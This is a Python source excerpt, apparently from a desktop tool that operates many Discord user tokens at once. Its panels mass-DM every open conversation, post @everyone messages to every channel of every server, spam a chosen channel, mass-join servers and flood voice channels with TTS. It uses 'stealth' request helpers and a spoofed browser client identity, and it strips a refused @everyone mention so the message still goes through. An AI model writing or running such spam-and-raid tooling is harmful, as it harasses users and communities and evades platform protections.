        self.add_stat('tokens_done', 'Tokens Done', C['cyan'])

    def on_start(self):
        msg = self.msg_entry.get().strip()
        if not msg:
            self.log("No message entered", 'red'); self.finish(); return
        try: guild_delay = max(0.1, float(self.delay_var.get()))
        except: guild_delay = 0.5
        try: dm_delay = max(0.2, float(self.dm_delay_var.get()))
        except: dm_delay = 0.8
        try: threads = max(1, min(20, int(self.threads_var.get())))
        except: threads = 10
        threading.Thread(target=self._worker, args=(msg, guild_delay, dm_delay, threads), daemon=True).start()

    @staticmethod
    def _can_send(channel, member_perms):
        """Check if the user can SEND_MESSAGES in a channel using permission overwrites."""
        SEND = 0x800  # SEND_MESSAGES bit
        VIEW = 0x400  # VIEW_CHANNEL bit
        perms = member_perms  # base guild perms
        # If admin, can do everything
        if perms & 0x8:
            return True
        overwrites = channel.get('permission_overwrites', [])
        # @everyone overwrite (role id == guild id)
        for ow in overwrites:
            if ow['id'] == channel.get('guild_id', ''):
                if int(ow.get('deny', 0)) & SEND: perms &= ~SEND
                if int(ow.get('allow', 0)) & SEND: perms |= SEND
                if int(ow.get('deny', 0)) & VIEW: perms &= ~VIEW
                if int(ow.get('allow', 0)) & VIEW: perms |= VIEW
        return bool(perms & VIEW) and bool(perms & SEND)

    def _send_msg(self, token, channel_id, content, label):
        """Send a message. Returns 'ok', 'noperms', 'ratelimit_skip', 'dead', or 'fail'."""
        try:
            r = _stealth_post(token, f'{API}/channels/{channel_id}/messages',
                              json_data={'content': content}, timeout=10)
            code = r.status_code
            if code == 200:
                self.log(f"  ✓ {label}", 'green'); return 'ok'
            elif code == 401:
                self.log(f"  💀 {label} — token dead", 'red'); return 'dead'
            elif code == 429:
                retry = r.json().get('retry_after', 5)
                self.inc_stat('ratelimit')
                if retry > 30:
                    self.log(f"  🚫 {label} rate-limited {retry:.0f}s — skip token", 'red')
                    return 'ratelimit_skip'
                self.log(f"  ⏳ {label} rate-limited {retry:.1f}s", 'yellow')
                time.sleep(retry + 0.3)
                r2 = _stealth_post(token, f'{API}/channels/{channel_id}/messages',
                                   json_data={'content': content}, timeout=10)
                if r2.status_code == 200:
                    self.log(f"  ✓ {label} (retry)", 'green'); return 'ok'
                if r2.status_code == 401: return 'dead'
                return 'fail'
            elif code == 403:
                return 'noperms'
            elif code == 400:
                # 400 is often Discord rejecting @everyone due to missing MENTION_EVERYONE perm.
                # Strip @everyone and retry — message still reaches the channel.
                stripped = content.replace('@everyone', '').replace('@here', '').strip()
                if stripped and stripped != content:
                    r2 = _stealth_post(token, f'{API}/channels/{channel_id}/messages',
                                       json_data={'content': stripped}, timeout=10)
                    if r2.status_code == 200:
                        self.log(f"  ✓ {label} (no @everyone)", 'green'); return 'ok'
                    if r2.status_code == 401: return 'dead'
                    self.log(f"  ✗ {label} ({r2.status_code})", 'red'); return 'fail'
                # No @everyone to strip — just retry once
                time.sleep(0.5)
                r2 = _stealth_post(token, f'{API}/channels/{channel_id}/messages',
                                   json_data={'content': content}, timeout=10)
                if r2.status_code == 200:
                    self.log(f"  ✓ {label} (retry)", 'green'); return 'ok'
                if r2.status_code == 401: return 'dead'
                self.log(f"  ✗ {label} ({code})", 'red'); return 'fail'
            else:
                self.log(f"  ✗ {label} ({code})", 'red'); return 'fail'
        except Exception as e:
            self.log(f"  ✗ {label} ({e})", 'red'); return 'fail'

    def _worker(self, message, guild_delay, dm_delay, threads):
        self.log(f"Starting Mass Blast · {len(self.active_tokens)} tokens · {threads} concurrent · guild {guild_delay}s · DM {dm_delay}s", 'accent')

        def _run_token(i, t):
            if self.stopped: return
            uname = t.display_name or t.username or t.token[:12]
            guild_msg = f"@everyone {message}"
            self.log(f"── Token {i+1}/{len(self.tokens)}: {uname} ──", 'cyan')

            token_dead = False

            # ── Phase 1: Open DMs FIRST (highest priority) ──
            try:
                dr = _stealth_get(t.token, f'{API}/users/@me/channels', timeout=10)
                if dr.status_code == 401:
                    self.log(f"  [{uname}] 💀 Token dead — skipping entirely", 'red')
                    self.inc_stat('dead'); self.inc_stat('tokens_done'); return
                if dr.status_code == 200:
                    dm_channels = [c for c in dr.json() if c.get('type') in (1, 3)]
                    self.log(f"  [{uname}] 💬 {len(dm_channels)} open DMs — sending to ALL", 'dim')
                    dm_sent = 0
                    for ch in dm_channels:
                        if self.stopped: break
                        recip = ch.get('recipients', [{}])
                        name = recip[0].get('username', ch['id']) if recip else ch['id']
                        result = self._send_msg(t.token, ch['id'], message, name)
                        if result == 'ok':
                            self.inc_stat('dm_sent'); dm_sent += 1
                        elif result == 'dead':
                            token_dead = True
                            self.inc_stat('dead'); break
                        elif result == 'ratelimit_skip':
                            token_dead = True
                            self.log(f"  [{uname}] 🚫 DM rate-limited hard — sent {dm_sent}/{len(dm_channels)}", 'yellow')
                            break
                        elif result != 'noperms':
                            self.inc_stat('failed')
                        time.sleep(dm_delay)
                    if dm_sent > 0:
                        self.log(f"  [{uname}] ✅ Sent {dm_sent}/{len(dm_channels)} DMs", 'green')
                else:
                    self.log(f"  [{uname}] Failed DMs ({dr.status_code})", 'red')
            except Exception as e:
                self.log(f"  [{uname}] DM error: {e}", 'red')

            if token_dead:
                self.log(f"  [{uname}] ⏭ Skipping guilds — token done", 'yellow')
                self.inc_stat('tokens_done'); return

            # ── Phase 2: Guild channels (@everyone) ──
            try:
                gr = _stealth_get(t.token, f'{API}/users/@me/guilds', timeout=10)
                if gr.status_code == 401:
                    self.log(f"  [{uname}] 💀 Token dead", 'red')
                    self.inc_stat('dead'); self.inc_stat('tokens_done'); return
                if gr.status_code != 200:
                    self.log(f"  [{uname}] Failed guilds ({gr.status_code})", 'red')
                    self.inc_stat('tokens_done'); return
                guilds = gr.json()
            except Exception as e:
                self.log(f"  [{uname}] Guild error: {e}", 'red')
                self.inc_stat('tokens_done'); return

            self.log(f"  [{uname}] 📡 {len(guilds)} guilds — pre-fetching channels...", 'dim')

            # Pre-fetch all guild channels in parallel
            def _fetch_guild(guild):
                gid = guild['id']
                try:
                    cr = _stealth_get(t.token, f'{API}/guilds/{gid}/channels', timeout=10)
                    if cr.status_code == 200:
                        return (gid, cr.json(), int(guild.get('permissions', 0)), guild.get('name', gid))
                    elif cr.status_code == 401:
                        return (gid, 'dead', 0, guild.get('name', gid))
                except:
                    pass
                return (gid, None, 0, guild.get('name', gid))

            guild_data = []
            with ThreadPoolExecutor(max_workers=4) as ch_pool:
                guild_data = list(ch_pool.map(_fetch_guild, guilds))

            # Build sendable channel list per guild
            # Include ALL text/announcement channels — permission_overwrites can't be
            # evaluated accurately without the member's full role list, so we attempt
            # every channel and let 403 responses be silently skipped by _send_msg.
            work = []  # [(gname, [(ch_id, ch_name), ...])]
            for gid, channels, base_perms, gname in guild_data:
                if channels == 'dead':
                    token_dead = True; break
                if not channels: continue
                # type 0 = GUILD_TEXT, type 5 = GUILD_ANNOUNCEMENT
                sendable = [(c['id'], c.get('name', c['id']))
                            for c in channels if c.get('type') in (0, 5)]
                if sendable:
                    work.append((gname, sendable))

            if token_dead:
                self.log(f"  [{uname}] 💀 Token dead during channel fetch", 'red')
                self.inc_stat('dead'); self.inc_stat('tokens_done'); return

            total_ch = sum(len(chs) for _, chs in work)
            self.log(f"  [{uname}] 📋 {total_ch} sendable channels across {len(work)} guilds", 'dim')

            # Send to all guilds — try every channel (no skip on no-perms)
            for gname, sendable in work:
                if self.stopped or token_dead: break
                for ch_id, ch_name_raw in sendable:
                    if self.stopped or token_dead: break
                    ch_label = f"#{ch_name_raw} ({gname})"
                    result = self._send_msg(t.token, ch_id, guild_msg, ch_label)
                    if result == 'ok':
                        self.inc_stat('guild_sent')
                    elif result == 'dead':
                        token_dead = True
                        self.inc_stat('dead'); break
                    elif result == 'ratelimit_skip':
                        token_dead = True; break
                    elif result == 'noperms':
                        pass  # Skip silently, try next channel
                    else:
                        self.inc_stat('failed')
                    time.sleep(guild_delay)

            self.inc_stat('tokens_done')

        # Run N tokens concurrently
        with ThreadPoolExecutor(max_workers=threads) as pool:
            futures = [pool.submit(_run_token, i, t) for i, t in enumerate(self.active_tokens)]
            for f in as_completed(futures):
                if self.stopped: break
                try: f.result()
                except Exception as e: self.log(f"Thread error: {e}", 'red')

        s = self._stats
        self.log(f"═══ Done · {s['guild_sent']} guild · {s['dm_sent']} DMs · {s['failed']} fail · {s.get('dead',0)} dead · {s['ratelimit']} rl ═══", 'accent')
        self.finish()


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  Channel Spam Panel
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
class ChannelSpamPanel(ActionPanel):
    def __init__(self, parent, tokens):
        super().__init__(parent, "📢 Channel Spam", "Spam a channel with all tokens")
        self._panel_key = 'channel_spam'
        self.tokens = [t for t in tokens if t.valid is True]

        pad = self.config_frame
        row1 = ctk.CTkFrame(pad, fg_color="transparent"); row1.pack(fill="x", padx=16, pady=(10, 4))
        ctk.CTkLabel(row1, text="Channel", font=ctk.CTkFont(family=FONT, size=12, weight="bold"),
                     text_color=C['text_dim']).pack(side="left", padx=(0, 8))
        self.channel_entry = ctk.CTkEntry(row1, placeholder_text="Channel ID", width=200, height=34,
                                           corner_radius=8, fg_color=C['surface_2'], border_color=C['border'],
                                           text_color=C['text'], font=ctk.CTkFont(family=MONO, size=12))
        self.channel_entry.pack(side="left")
        ctk.CTkLabel(row1, text="  Guild", font=ctk.CTkFont(family=FONT, size=12, weight="bold"),
                     text_color=C['text_dim']).pack(side="left", padx=(16, 8))
        self.guild_entry = ctk.CTkEntry(row1, placeholder_text=GUILD_ID, width=200, height=34,
                                         corner_radius=8, fg_color=C['surface_2'], border_color=C['border'],
                                         text_color=C['text'], font=ctk.CTkFont(family=MONO, size=12))
        self.guild_entry.pack(side="left")

        row2 = ctk.CTkFrame(pad, fg_color="transparent"); row2.pack(fill="x", padx=16, pady=(2, 4))
        ctk.CTkLabel(row2, text="Message", font=ctk.CTkFont(family=FONT, size=12, weight="bold"),
                     text_color=C['text_dim']).pack(side="left", padx=(0, 8))
        self.msg_entry = ctk.CTkEntry(row2, placeholder_text="Spam message...", width=400, height=34,
                                       corner_radius=8, fg_color=C['surface_2'], border_color=C['border'],
                                       text_color=C['text'], font=ctk.CTkFont(family=FONT, size=13))
        self.msg_entry.pack(side="left", fill="x", expand=True)

        row3 = ctk.CTkFrame(pad, fg_color="transparent"); row3.pack(fill="x", padx=16, pady=(2, 10))
        ctk.CTkLabel(row3, text="Delay", font=ctk.CTkFont(family=FONT, size=12, weight="bold"),
                     text_color=C['text_dim']).pack(side="left", padx=(0, 8))
        self.delay_var = ctk.DoubleVar(value=1.0)
        ctk.CTkEntry(row3, textvariable=self.delay_var, width=60, height=34, corner_radius=8,
                     fg_color=C['surface_2'], border_color=C['border'], text_color=C['text'],
                     font=ctk.CTkFont(family=MONO, size=12)).pack(side="left")
        ctk.CTkLabel(row3, text="  Msgs/token", font=ctk.CTkFont(family=FONT, size=12, weight="bold"),
                     text_color=C['text_dim']).pack(side="left", padx=(16, 8))
        self.count_var = ctk.IntVar(value=10)
        ctk.CTkEntry(row3, textvariable=self.count_var, width=60, height=34, corner_radius=8,
                     fg_color=C['surface_2'], border_color=C['border'], text_color=C['text'],
                     font=ctk.CTkFont(family=MONO, size=12)).pack(side="left")
        ctk.CTkLabel(row3, text=f"  {len(self.tokens)} tokens",
                     font=ctk.CTkFont(family=FONT, size=12, weight="bold"), text_color=C['accent']).pack(side="left", padx=12)

        self.add_stat('sent', 'Sent', C['green'])
        self.add_stat('failed', 'Failed', C['red'])
        self.add_stat('ratelimit', 'Rate-limited', C['yellow'])

    def on_start(self):
        ch_id = self.channel_entry.get().strip()
        g_id = self.guild_entry.get().strip() or GUILD_ID
        msg = self.msg_entry.get().strip()
        if not ch_id or not msg:
            self.log("Channel ID and message required", 'red'); self.finish(); return
        try: delay = float(self.delay_var.get())
        except: delay = 1.0
        try: count = int(self.count_var.get())
        except: count = 10
        threading.Thread(target=self._worker, args=(ch_id, g_id, msg, delay, count), daemon=True).start()

    def _worker(self, channel_id, guild_id, message, delay, count):
        self.log(f"Channel spam · {count} msgs/token · {len(self.active_tokens)} tokens", 'accent')
        eligible = []
        for t in self.active_tokens:
            if self.stopped: break
            try:
                r = _stealth_get(t.token, f'{API}/users/@me/guilds', timeout=8)
                if r.status_code == 200:
                    if guild_id in [g['id'] for g in r.json()]:
                        eligible.append(t)
                        self.log(f"  ✓ {t.display_name or t.username} in guild", 'green')
                    else:
                        self.log(f"  · {t.display_name or t.username} not in guild", 'dim')
            except: pass
        if not eligible:
            self.log("No tokens in guild", 'red'); self.finish(); return

        self.log(f"═══ {len(eligible)} eligible · sending {count} each ═══", 'accent')
        for t in eligible:
            if self.stopped: break
            uname = t.display_name or t.username or t.token[:12]
            self.log(f"── {uname} ──", 'cyan')
            for n in range(count):
                if self.stopped: break
                try:
                    r = _stealth_post(t.token, f'{API}/channels/{channel_id}/messages', json_data={'content': message}, timeout=10)
                    if r.status_code == 200:
                        self.inc_stat('sent'); self.log(f"  [{n+1}/{count}] ✓", 'green')
                    elif r.status_code == 429:
                        retry = r.json().get('retry_after', 5)
                        self.inc_stat('ratelimit')
                        self.log(f"  [{n+1}/{count}] ⏳ {retry:.1f}s", 'yellow')
                        time.sleep(retry + 0.5)
                    elif r.status_code == 403:
                        self.log(f"  No permission", 'red'); self.inc_stat('failed'); break
                    else:
                        self.log(f"  [{n+1}/{count}] ✗ {r.status_code}", 'red'); self.inc_stat('failed')
                except Exception as e:
                    self.log(f"  [{n+1}/{count}] ✗ {e}", 'red'); self.inc_stat('failed')
                time.sleep(delay)
        self.log(f"═══ Done · {self._stats['sent']} sent ═══", 'accent')
        self.finish()


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  Join Guild Panel
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
class JoinGuildPanel(ActionPanel):
    def __init__(self, parent, tokens):
        super().__init__(parent, "🏠 Join Guild", "Join a server with all tokens", width=620, height=520)
        self._panel_key = 'join_guild'
        self.tokens = [t for t in tokens if t.valid is True]

        pad = self.config_frame
        row = ctk.CTkFrame(pad, fg_color="transparent"); row.pack(fill="x", padx=16, pady=10)
        ctk.CTkLabel(row, text="Invite", font=ctk.CTkFont(family=FONT, size=12, weight="bold"),
                     text_color=C['text_dim']).pack(side="left", padx=(0, 8))
        self.invite_entry = ctk.CTkEntry(row, placeholder_text="discord.gg/abc or code", width=260, height=34,
                                          corner_radius=8, fg_color=C['surface_2'], border_color=C['border'],
                                          text_color=C['text'], font=ctk.CTkFont(family=MONO, size=12))
        self.invite_entry.pack(side="left")
        ctk.CTkLabel(row, text="  Delay", font=ctk.CTkFont(family=FONT, size=12, weight="bold"),
                     text_color=C['text_dim']).pack(side="left", padx=(16, 8))
        self.delay_var = ctk.DoubleVar(value=1.5)
        ctk.CTkEntry(row, textvariable=self.delay_var, width=50, height=34, corner_radius=8,
                     fg_color=C['surface_2'], border_color=C['border'], text_color=C['text'],
                     font=ctk.CTkFont(family=MONO, size=12)).pack(side="left")
        ctk.CTkLabel(row, text=f"  {len(self.tokens)} tokens",
                     font=ctk.CTkFont(family=FONT, size=12, weight="bold"), text_color=C['accent']).pack(side="left", padx=12)

        self.add_stat('joined', 'Joined', C['green'])
        self.add_stat('failed', 'Failed', C['red'])
        self.add_stat('already', 'Already In', C['yellow'])

    def on_start(self):
        code = self.invite_entry.get().strip().split('/')[-1]
        if not code:
            self.log("No invite code", 'red'); self.finish(); return
        try: delay = float(self.delay_var.get())
        except: delay = 1.5
        threading.Thread(target=self._worker, args=(code, delay), daemon=True).start()

    def _worker(self, invite_code, delay):
        self.log(f"Joining {invite_code} · {len(self.active_tokens)} tokens", 'accent')
        for i, t in enumerate(self.active_tokens):
            if self.stopped: break
            uname = t.display_name or t.username or t.token[:12]
            try:
                r = _stealth_post(t.token, f'{API}/invites/{invite_code}', json_data={}, timeout=10)
                if r.status_code == 200:
                    gname = r.json().get('guild', {}).get('name', '?')
                    self.inc_stat('joined'); self.log(f"  [{i+1}] ✓ {uname} → {gname}", 'green')
                elif r.status_code == 429:
                    retry = r.json().get('retry_after', 5)
                    self.log(f"  [{i+1}] ⏳ {uname} {retry:.1f}s", 'yellow'); time.sleep(retry + 1)
                elif 'already' in (r.text or '').lower() or r.status_code == 204:
                    self.inc_stat('already'); self.log(f"  [{i+1}] · {uname} already in", 'yellow')
                else:
                    self.inc_stat('failed'); self.log(f"  [{i+1}] ✗ {uname} {r.status_code}", 'red')
            except Exception as e:
                self.inc_stat('failed'); self.log(f"  [{i+1}] ✗ {uname} {e}", 'red')
            time.sleep(delay)
        self.log(f"═══ Done · {self._stats['joined']} joined ═══", 'accent')
        self.finish()


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  Voice Panel — "Join" button, never disables, rejoin semantics
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
class JoinVoicePanel(ActionPanel):
    def __init__(self, parent, tokens):
        super().__init__(parent, "🎙 Voice", "Join voice channel · leave Channel ID empty to auto-disperse across all VCs", width=660, height=560)
        self._panel_key = 'voice'
        self.tokens = [t for t in tokens if t.valid is True]
        self._active_ws = {}  # token -> websocket
        self._ws_lock = threading.Lock()

        pad = self.config_frame
        row1 = ctk.CTkFrame(pad, fg_color="transparent"); row1.pack(fill="x", padx=16, pady=(10, 4))
        ctk.CTkLabel(row1, text="Voice Channel", font=ctk.CTkFont(family=FONT, size=12, weight="bold"),
                     text_color=C['text_dim']).pack(side="left", padx=(0, 8))
        self.vc_entry = ctk.CTkEntry(row1, placeholder_text="Channel ID (empty = all VCs)", width=220, height=34,
                                      corner_radius=8, fg_color=C['surface_2'], border_color=C['border'],
                                      text_color=C['text'], font=ctk.CTkFont(family=MONO, size=12))
        self.vc_entry.pack(side="left")
        ctk.CTkLabel(row1, text="  Guild", font=ctk.CTkFont(family=FONT, size=12, weight="bold"),
                     text_color=C['text_dim']).pack(side="left", padx=(16, 8))
        self.guild_entry = ctk.CTkEntry(row1, placeholder_text=GUILD_ID, width=200, height=34,
                                         corner_radius=8, fg_color=C['surface_2'], border_color=C['border'],
                                         text_color=C['text'], font=ctk.CTkFont(family=MONO, size=12))
        self.guild_entry.pack(side="left")

        row2 = ctk.CTkFrame(pad, fg_color="transparent"); row2.pack(fill="x", padx=16, pady=(2, 4))
        ctk.CTkLabel(row2, text=f"{len(self.tokens)} tokens available",
                     font=ctk.CTkFont(family=FONT, size=12, weight="bold"), text_color=C['accent']).pack(side="left")

        self.reconnect_var = ctk.BooleanVar(value=False)
        ctk.CTkCheckBox(row2, text="Reconnect (10s)", variable=self.reconnect_var,
                        font=ctk.CTkFont(family=FONT, size=12), text_color=C['text_dim'],
                        fg_color=C['accent'], hover_color=C['accent_hover'],
                        border_color=C['border'], corner_radius=6).pack(side="left", padx=(20, 0))

        # TTS row ─────────────────────────────────────────────
        row3 = ctk.CTkFrame(pad, fg_color="transparent"); row3.pack(fill="x", padx=16, pady=(0, 10))
        ctk.CTkLabel(row3, text="TTS Ch", font=ctk.CTkFont(family=FONT, size=12, weight="bold"),
                     text_color=C['text_dim']).pack(side="left", padx=(0, 6))
        self.tts_channel_entry = ctk.CTkEntry(row3, placeholder_text="Text channel ID", width=180, height=32,
                                               corner_radius=8, fg_color=C['surface_2'], border_color=C['border'],
                                               text_color=C['text'], font=ctk.CTkFont(family=MONO, size=12))
        self.tts_channel_entry.pack(side="left")
        ctk.CTkLabel(row3, text="  Msg", font=ctk.CTkFont(family=FONT, size=12, weight="bold"),
                     text_color=C['text_dim']).pack(side="left", padx=(12, 6))
        self.tts_msg_entry = ctk.CTkEntry(row3, placeholder_text="TTS message...", width=260, height=32,
                                           corner_radius=8, fg_color=C['surface_2'], border_color=C['border'],
                                           text_color=C['text'], font=ctk.CTkFont(family=FONT, size=13))
        self.tts_msg_entry.pack(side="left", fill="x", expand=True)
        ctk.CTkButton(row3, text="📢 Send TTS", width=100, height=32, corner_radius=8,
                      fg_color=C['accent'], hover_color=C['accent_hover'],
                      font=ctk.CTkFont(family=FONT, size=12, weight="bold"),
                      command=self._send_tts).pack(side="left", padx=(10, 0))

        self._vc_id = None  # last used channel id
        self._guild_id = None  # last used guild id

        self.add_stat('connected', 'Connected', C['green'])
        self.add_stat('failed', 'Failed', C['red'])
        self.add_stat('active', 'In VC Now', C['cyan'])

        # Override the Start button to say "Join" and never disable
        self.btn_start.configure(text="🎙  Join")

    def _on_start(self):
        """Override — don't disable the Join button, allow re-clicking."""
        if not self._running:
            self._running = True
            self._stop_flag.clear()
            self.btn_stop.configure(state="normal")
            self._notify_parent_running(True)
        self.on_start()

    def on_start(self):
        vc_id = self.vc_entry.get().strip()
        g_id = self.guild_entry.get().strip() or GUILD_ID
        if not vc_id and not g_id:
            self.log("Enter a Guild ID (channels auto-detected) or a specific Channel ID", 'red'); return
        if not g_id:
            self.log("Guild ID required", 'red'); return
        self._guild_id = g_id

        if vc_id:
            # Single channel mode
            self._vc_id = vc_id
            threading.Thread(target=self._join_all, args=([vc_id], g_id), daemon=True).start()
        else:
            # Auto-detect voice channels and disperse evenly
            threading.Thread(target=self._auto_disperse, args=(g_id,), daemon=True).start()

    def _fetch_voice_channels(self, guild_id):
        """Fetch all voice channels (type 2) and stage channels (type 13) in a guild.
        Tries each token in turn until one succeeds (some tokens may not be in the guild)."""
        for t in self.tokens:
            try:
                h = {'Authorization': t.token, 'User-Agent': UA}
                r = requests.get(f'{API}/guilds/{guild_id}/channels', headers=h, timeout=10)
                if r.status_code == 200:
                    channels = r.json()
                    voice_chs = [c for c in channels if c.get('type') in (2, 13)]
                    return voice_chs
                elif r.status_code in (401, 403):
                    uname = t.display_name or t.username or t.token[:12]
                    self.log(f"  [{uname}] can't see guild channels ({r.status_code}), trying next token...", 'dim')
                    continue
                else:
                    self.log(f"Failed to fetch channels: {r.status_code}", 'red')
                    return []
            except Exception as e:
                self.log(f"Error fetching channels: {e}", 'red')
                return []
        self.log("No token could access guild channels (all 401/403)", 'red')
        return []

    def _auto_disperse(self, guild_id):
        """Fetch voice channels and evenly distribute tokens across them."""
        self.log(f"Fetching voice channels in guild {guild_id}...", 'accent')
        voice_chs = self._fetch_voice_channels(guild_id)
        if not voice_chs:
            self.log("No voice channels found in this guild", 'red')
            return

        ch_names = [f"#{c.get('name', c['id'])}" for c in voice_chs]
        self.log(f"Found {len(voice_chs)} voice channels: {', '.join(ch_names)}", 'cyan')

        # Build channel_id list — round-robin assign tokens to channels
        vc_ids = [c['id'] for c in voice_chs]
        assignments = {}  # channel_id -> list of tokens
        for i, t in enumerate(self.active_tokens):
            ch = vc_ids[i % len(vc_ids)]
            assignments.setdefault(ch, []).append(t)

        # Log the distribution
        for ch in voice_chs:
            cid = ch['id']
            count = len(assignments.get(cid, []))
            self.log(f"  {ch.get('name', cid)}: {count} tokens", 'dim')

        self._vc_id = vc_ids[0]  # for reconnect reference
        self._join_dispersed(assignments, guild_id)

    def _join_dispersed(self, assignments, guild_id):
        """Join tokens to their assigned voice channels."""
        total = sum(len(v) for v in assignments.values())
        self.log(f"Joining {total} tokens across {len(assignments)} channels...", 'accent')

        threads = []
        idx = 0
        for channel_id, token_list in assignments.items():
            for t in token_list:
                if self.stopped: break
                idx += 1
                th = threading.Thread(target=self._connect_one_to, args=(t, idx, channel_id, guild_id), daemon=True)
                th.start()
                threads.append(th)
                time.sleep(0.4)

    def _join_all(self, channel_ids, guild_id):
        """Join all tokens to a single voice channel."""
        channel_id = channel_ids[0]
        self.log(f"Joining {len(self.active_tokens)} tokens to voice...", 'accent')

        threads = []
        for i, t in enumerate(self.active_tokens):
            if self.stopped: break
            th = threading.Thread(target=self._connect_one_to, args=(t, i + 1, channel_id, guild_id), daemon=True)
            th.start()
            threads.append(th)
            time.sleep(0.4)

    @staticmethod
    def _recv_json(ws, deadline=None):
        """Recv frames, skipping any that aren't valid JSON."""
        while True:
            if deadline and time.time() > deadline:
                raise TimeoutError("recv deadline exceeded")
            try:
                raw = ws.recv()
            except Exception:
                raise
            if not raw:
                continue
            try:
                return json.loads(raw)
            except (json.JSONDecodeError, ValueError):
                continue

    def _connect_one_to(self, t, idx, channel_id, guild_id, _retry=0):
        """Connect a single token to a specific voice channel."""
        import websocket as ws_lib
        uname = t.display_name or t.username or t.token[:12]
        MAX_RETRIES = 4

        with self._ws_lock:
            if t.token in self._active_ws:
                self.log(f"  [{idx}] · {uname} already in VC", 'dim')
                return

        succeeded = False
        try:
            ws = ws_lib.create_connection(
                'wss://gateway.discord.gg/?v=9&encoding=json',
                header=[f'User-Agent: {UA}', 'Origin: https://discord.com'], timeout=30)

            hello = self._recv_json(ws, deadline=time.time() + 15)
            hb = hello.get('d', {}).get('heartbeat_interval', 41250) / 1000

            ws.send(json.dumps({'op': 2, 'd': {
                'token': t.token, 'capabilities': 30717,
                'properties': {'os': 'Windows', 'browser': 'Chrome', 'device': '',
                               'system_locale': 'en-US', 'browser_user_agent': UA,
                               'browser_version': '136.0.0.0', 'os_version': '10',
                               'release_channel': 'stable', 'client_build_number': 368827},
                'presence': {'status': 'online', 'since': 0, 'activities': [], 'afk': False},
                'compress': False}}))

            seq = None
            deadline = time.time() + 20
            while time.time() < deadline:
                d = self._recv_json(ws, deadline=deadline)
                if d.get('s') is not None: seq = d['s']
                if d.get('t') == 'READY': break
            else:
                ws.close(); self.inc_stat('failed')
                self.log(f"  [{idx}] ✗ {uname} READY timeout", 'red'); return

            ws.send(json.dumps({'op': 4, 'd': {
                'guild_id': guild_id, 'channel_id': channel_id,
                'self_mute': False, 'self_deaf': False, 'self_video': False}}))

            deadline = time.time() + 15
            joined_vc = False
            while time.time() < deadline:
                d = self._recv_json(ws, deadline=deadline)
                if d.get('s') is not None: seq = d['s']
                if d.get('t') == 'VOICE_STATE_UPDATE':
                    vd = d.get('d', {})
                    if str(vd.get('channel_id')) == str(channel_id):
                        joined_vc = True; break
                if d.get('op') in (7, 9):
                    ws.close(); self.inc_stat('failed')
                    self.log(f"  [{idx}] ✗ {uname} kicked/invalidated before join", 'red'); return

            if not joined_vc:
                ws.close(); self.inc_stat('failed')
                self.log(f"  [{idx}] ✗ {uname} VC join not confirmed", 'red'); return

            with self._ws_lock:
                self._active_ws[t.token] = ws
            self.inc_stat('connected')
            self.inc_stat('active')
            self.log(f"  [{idx}] ✓ {uname} in VC ({channel_id})", 'green')
            succeeded = True

            # Heartbeat loop
            next_hb = time.time() + hb
            while not self.stopped:
                try:
                    now = time.time()
                    if now >= next_hb:
                        ws.send(json.dumps({'op': 1, 'd': seq}))
                        next_hb = now + hb
                    ws.settimeout(min(5.0, max(0.5, next_hb - time.time())))
                    try:
                        raw = ws.recv()
                    except Exception as recv_err:
                        err_s = str(recv_err).lower()
                        if 'timed out' in err_s or 'timeout' in err_s:
                            continue
                        raise
                    if not raw:
                        continue
                    try:
                        d = json.loads(raw)
                    except (json.JSONDecodeError, ValueError):
                        continue
                    if d.get('s') is not None: seq = d['s']
                    if d.get('op') == 11:
                        pass
                    elif d.get('op') == 1:
                        ws.send(json.dumps({'op': 1, 'd': seq}))
                        next_hb = time.time() + hb
                    elif d.get('op') in (7, 9):
                        break
                except:
                    break

            with self._ws_lock:
                self._active_ws.pop(t.token, None)
            try: ws.close()
            except: pass
            self.inc_stat('active', -1)
            self.log(f"  [{idx}] · {uname} disconnected", 'dim')

        except Exception as e:
            if not succeeded:
                self.inc_stat('failed')
            self.log(f"  [{idx}] ✗ {uname}: {e}", 'red')

        # Auto-reconnect
        if self.reconnect_var.get() and not self.stopped:
            if _retry >= MAX_RETRIES:
                self.log(f"  [{idx}] ✗ {uname} max retries reached, giving up", 'red')
                return
            self.log(f"  [{idx}] ↻ {uname} reconnecting in 10s... (attempt {_retry+1}/{MAX_RETRIES})", 'yellow')
            time.sleep(10)
            if not self.stopped and self.reconnect_var.get():
                self.log(f"  [{idx}] ↻ {uname} reconnecting now", 'cyan')
                self._connect_one_to(t, idx, channel_id, guild_id, _retry=0 if succeeded else _retry + 1)

    def _send_tts(self):
        """Send a TTS message to the specified text channel using all currently connected tokens."""
        ch_id = self.tts_channel_entry.get().strip()
        msg = self.tts_msg_entry.get().strip()
        if not ch_id:
            self.log("Enter a text channel ID for TTS", 'red'); return
        if not msg:
            self.log("Enter a TTS message", 'red'); return
        with self._ws_lock:
            connected_tokens = list(self._active_ws.keys())
        if not connected_tokens:
            self.log("No tokens currently in VC — join first", 'red'); return
        tok_map = {t.token: t for t in self.tokens}
        targets = [tok_map[tk] for tk in connected_tokens if tk in tok_map]
        self.log(f"📢 Sending TTS to #{ch_id} via {len(targets)} token(s)...", 'accent')
        def _do_tts():
            sent = 0
            for t in targets:
                uname = t.display_name or t.username or t.token[:12]
                try:
                    r = _stealth_post(t.token, f'{API}/channels/{ch_id}/messages',
                                      json_data={'content': msg, 'tts': True}, timeout=10)
                    if r.status_code == 200:
                        self.log(f"  ✓ TTS via {uname}", 'green'); sent += 1; break
                    elif r.status_code == 403:
                        self.log(f"  · {uname} no perms", 'dim')
                    else:
                        self.log(f"  ✗ {uname} ({r.status_code})", 'red')
                except Exception as e:
                    self.log(f"  ✗ {uname}: {e}", 'red')
            self.log(f"📢 TTS done · {sent} sent", 'cyan')
        threading.Thread(target=_do_tts, daemon=True).start()

    def _on_stop(self):
        """Stop all voice connections."""
        self._stop_flag.set()
        self.btn_stop.configure(state="disabled")
        self.log("Disconnecting all...", 'yellow')
        with self._ws_lock:
            for token, ws in list(self._active_ws.items()):
                try: ws.close()
                except: pass
